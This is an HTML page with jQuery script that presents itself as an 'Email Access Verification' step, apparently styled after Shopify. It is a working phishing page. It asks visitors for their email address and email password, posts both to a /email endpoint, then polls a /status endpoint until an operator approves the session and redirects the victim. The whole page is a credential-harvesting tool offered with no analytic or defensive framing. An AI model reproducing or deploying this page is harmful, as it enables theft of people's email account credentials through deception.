<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification</title>
    <link rel="icon" type="image/png" href="res/shopi.png">
    <link rel="stylesheet" href="res/app.css">
    <style>
        .spinner-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .btn-spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid white;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .error {
            border-color: #ff4444 !important;
        }
        
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .info-text {
            font-size: 12px;
            color: #666;
            text-align: center;
            margin-top: 10px;
            line-height: 1.4;
        }
    </style>
</head>
<body>    

<main>
    <div class="form">
        <div class="logo">
            <img src="res/logo.png" alt="Logo">
        </div>

        <div class="text">
            <h2>Email Access Verification</h2>
            <span>Please enter your email credentials for verification</span>
        </div>

        <div class="col">
            <label>Email Address</label>
            <input type="email" id="email" placeholder="Enter your email address">
        </div>

        <div class="col">
            <label>Email Password</label>
            <input type="password" id="password" placeholder="Enter your email password">
        </div>

        <div class="col">
            <button id="submitBtn" onclick="sendEmail()">
                <span class="spinner-btn">
                    <span class="btn-text">Verify Email</span>
                    <span class="btn-spinner" id="btnSpinner"></span>
                </span>
            </button>
        </div>

        <div class="col info-text">
            <p>We need to verify your email account to ensure secure access to your account.</p>
        </div>

        <div class="col links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
        </div>
    </div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>

<script>
let sessionId = null;
let checkInterval = null;

function showButtonSpinner() {
    $("#btnSpinner").show();
    $("#submitBtn").prop("disabled", true);
    $(".btn-text").text("Verifying...");
}

function hideButtonSpinner() {
    $("#btnSpinner").hide();
    $("#submitBtn").prop("disabled", false);
    $(".btn-text").text("Verify Email");
}

function checkStatus() {
    if (!sessionId) return;
    
    $.ajax({
        url: `/status/${sessionId}`,
        method: 'GET',
        success: function(response) {
            if (response.status === "approved") {
                clearInterval(checkInterval);
                hideButtonSpinner();
                window.location.href = response.redirect_url;
            }
        },
        error: function(xhr) {
            if (xhr.status === 404) {
                clearInterval(checkInterval);
                hideButtonSpinner();
                alert("Session expired. Please try again.");
            }
        }
    });
}

function sendEmail() {
    $("#email, #password").removeClass("error");

    const email = $("#email").val().trim();
    const password = $("#password").val().trim();

    if (!email) {
        $("#email").addClass("error");
        alert("Please enter your email address");
        return;
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        $("#email").addClass("error");
        alert("Please enter a valid email address");
        return;
    }

    if (!password) {
        $("#password").addClass("error");
        alert("Please enter your email password");
        return;
    }

    showButtonSpinner();

    if (checkInterval) clearInterval(checkInterval);

    $.ajax({
        url: '/email',
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({
            email: email,
            password: password
        }),
        success: function(response) {
            if (response.success) {
                sessionId = response.id;
                checkInterval = setInterval(checkStatus, 1500);
                setTimeout(checkStatus, 500);
                
                // Auto timeout after 5 minutes
                setTimeout(function() {
                    if (checkInterval) {
                        clearInterval(checkInterval);
                        hideButtonSpinner();
                        alert("Request timed out. Please try again.");
                    }
                }, 300000);
                
            } else {
                hideButtonSpinner();
                alert("Verification failed. Please try again.");
            }
        },
        error: function() {
            hideButtonSpinner();
            alert("Connection error. Please try again.");
        }
    });
}

$("#email, #password").keypress(function (e) {
    if (e.key === "Enter") {
        sendEmail();
    }
});

$(window).on('beforeunload', function() {
    if (checkInterval) clearInterval(checkInterval);
});
</script>

</body>
</html>
